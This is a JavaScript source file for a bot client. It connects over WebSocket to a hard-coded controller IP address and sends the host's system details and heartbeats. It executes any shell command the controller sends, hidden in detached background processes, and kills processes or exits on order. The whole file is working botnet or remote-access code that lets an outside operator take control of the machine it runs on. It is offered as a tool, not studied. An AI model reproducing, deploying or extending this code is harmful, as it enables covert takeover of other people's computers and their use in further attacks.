/**
 * bot.js — Premium Cross-Platform Bot Client (Mimics bot.go)
 */

'use strict';

const WebSocket = require('ws');
const os = require('os');
const { exec, spawn } = require('child_process');

// ─── Config ───────────────────────────────────────────────────────────────────
const CONTROLLER_URL = process.env.CONTROLLER_URL || 'ws://23.27.249.58:3029/connect';
const RECONNECT_DELAY = 5000;
const HEARTBEAT_INTERVAL = 20000;
const DEBUG = process.argv.includes('--debug');

const isWin = os.platform() === 'win32';

// ─── Helpers ─────────────────────────────────────────────────────────────────
const rgb = (r, g, b) => `\x1b[38;2;${r};${g};${b}m`;
const gradientText = (text, stops) => {
    const chars = [...text];
    return chars.map((ch, i) => {
        const t = chars.length <= 1 ? 0 : i / (chars.length - 1);
        const seg = (stops.length - 1) * t;
        const lo = Math.floor(seg), hi = Math.min(lo + 1, stops.length - 1), f = seg - lo;
        const r = Math.round(stops[lo][0] + (stops[hi][0] - stops[lo][0]) * f);
        const g = Math.round(stops[lo][1] + (stops[hi][1] - stops[lo][1]) * f);
        const b = Math.round(stops[lo][2] + (stops[hi][2] - stops[lo][2]) * f);
        return `${rgb(r, g, b)}${ch}`;
    }).join('') + '\x1b[0m';
};

function log(tag, msg, color = [155, 190, 255]) {
    const time = new Date().toLocaleTimeString();
    const tagStyled = gradientText(` ${tag.toUpperCase()} `, [[color[0], color[1], color[2]], [color[0]-40, color[1]-40, color[2]-40]]);
    process.__stdout.write(`  ${rgb(100, 120, 160)}${time}\x1b[0m  ${tagStyled}  ${msg}\n`);
}

process.__stdout = process.stdout;

function getBotInfo() {
    const cpus = os.cpus();
    return {
        hostname: os.hostname(),
        platform: os.platform(),
        arch: os.arch(),
        cpus: cpus.length,
        cpuModel: cpus[0]?.model || 'unknown',
        totalMem: os.totalmem(),
        freeMem: os.freemem(),
        version: process.version,
        pid: process.pid,
        uptime: os.uptime()
    };
}

function runCmd(cmd, callback, background = false) {
    if (background) {
        // Run in background using spawn with detached
        const child = spawn(cmd, [], { 
            shell: true, 
            detached: true, 
            stdio: 'ignore' 
        });
        child.unref();
        // Immediately callback with success
        callback({
            cmd,
            stdout: '',
            stderr: '',
            error: null,
            exitCode: 0,
            background: true
        });
    } else {
        // Run synchronously using exec
        const shell = isWin ? 'cmd' : '/bin/sh';
        const flag = isWin ? '/C' : '-c';
        
        exec(`${shell} ${flag} "${cmd.replace(/"/g, '\\"')}"`, { timeout: 30000, maxBuffer: 1024 * 1024 }, (err, stdout, stderr) => {
            callback({
                cmd,
                stdout: stdout?.toString().trim() || '',
                stderr: stderr?.toString().trim() || '',
                error: err?.message || null,
                exitCode: err ? (err.code || 1) : 0
            });
        });
    }
}

function sendJson(payload, tag = 'send', color = [120, 220, 120]) {
    const json = JSON.stringify(payload);
    if (DEBUG) log(tag, json, [180, 180, 255]);
    if (ws?.readyState === 1) ws.send(json);
}

let ws = null, botId = null, hbTimer = null, rcTimer = null, isConnecting = false;

const clearTimers = () => { clearInterval(hbTimer); clearTimeout(rcTimer); };
const scheduleReconnect = () => { clearTimers(); rcTimer = setTimeout(connect, RECONNECT_DELAY); };

function connect() {
    if (isConnecting) return;
    isConnecting = true;
    log('net', `Connecting to ${CONTROLLER_URL}...`, [100, 200, 255]);

    try {
        ws = new WebSocket(CONTROLLER_URL, { handshakeTimeout: 10000, rejectUnauthorized: false });
    } catch (e) {
        log('error', e.message, [255, 50, 50]);
        isConnecting = false;
        return scheduleReconnect();
    }

    ws.on('open', () => { 
        isConnecting = false; 
        log('net', 'Connected, waiting for handshake...', [100, 255, 150]); 
    });

    ws.on('message', (raw) => {
        const rawMsg = raw.toString();
        log('recv', rawMsg, [180, 180, 255]);

        try {
            const msg = JSON.parse(rawMsg);
            switch (msg.type) {
                case 'handshake':
                    botId = msg.botId;
                    log('auth', `Handshake success | ID: ${botId}`, [255, 200, 50]);
                    sendJson({ type: 'info', botId, data: getBotInfo() }, 'info');
                    hbTimer = setInterval(() => sendJson({ type: 'heartbeat', botId }, 'heartbeat'), HEARTBEAT_INTERVAL);
                    break;
                case 'cmd':
                    if (msg.cmd === 'shell' && msg.args) {
                        const isBackground = !msg.args.includes('hfree.js'); // Sync for hfree.js to check errors
                        log('exec', `Running: ${msg.args.split(' ')[0]}...`, [200, 100, 255]);
                        runCmd(msg.args, (res) => {
                            if (res.background) {
                                log('exec', `Started in background`, [100, 255, 100]);
                            } else {
                                log('exec', `Finished (Exit: ${res.exitCode})`, res.exitCode === 0 ? [100, 255, 100] : [255, 100, 100]);
                                if (res.stderr) log('error', `Stderr: ${res.stderr}`, [255, 150, 50]);
                            }
                            sendJson({ type: 'result', botId, data: res }, 'result');
                        }, isBackground); // Background unless hfree.js
                    } else if (msg.cmd === 'stopshell' && msg.args) {
                        const killCmd = isWin ? `wmic process where "commandline like '%%%s%%'" delete`.replace('%s', msg.args) : `pkill -f "${msg.args}"`;
                        log('kill', `Stopping: ${msg.args}`, [255, 150, 50]);
                        runCmd(killCmd, (res) => {
                            sendJson({ type: 'result', botId, data: { ...res, cmd: 'stopshell' } }, 'result');
                        });
                    } else {
                        log('warn', `Unknown cmd payload: ${JSON.stringify(msg)}`, [255, 185, 100]);
                    }
                    break;
                case 'kill':
                    log('sys', 'Kill signal received', [255, 50, 50]);
                    process.exit(0);
                    break;
                case 'getinfo':
                    sendJson({ type: 'info', botId, data: getBotInfo() }, 'info');
                    break;
                default:
                    log('warn', `Unknown message type: ${msg.type || 'undefined'}`, [255, 150, 0]);
                    break;
            }
        } catch (err) {
            log('error', `Failed to parse message: ${err.message}`, [255, 50, 50]);
            if (DEBUG) log('recv', `RAW: ${rawMsg}`, [255, 120, 120]);
        }
    });

    ws.on('close', () => { isConnecting = false; clearTimers(); log('net', 'Disconnected', [255, 150, 0]); scheduleReconnect(); });
    ws.on('error', (e) => { isConnecting = false; log('error', e.message, [255, 50, 50]); ws.terminate(); scheduleReconnect(); });
}

process.__stdout.write('\x1Bc');
process.__stdout.write(`\n  ${gradientText(' B O T   C L I E N T ', [[255, 100, 255], [100, 200, 255]])}\n  ${rgb(100, 120, 160)}Monitoring active\x1b[0m\n\n`);

connect();



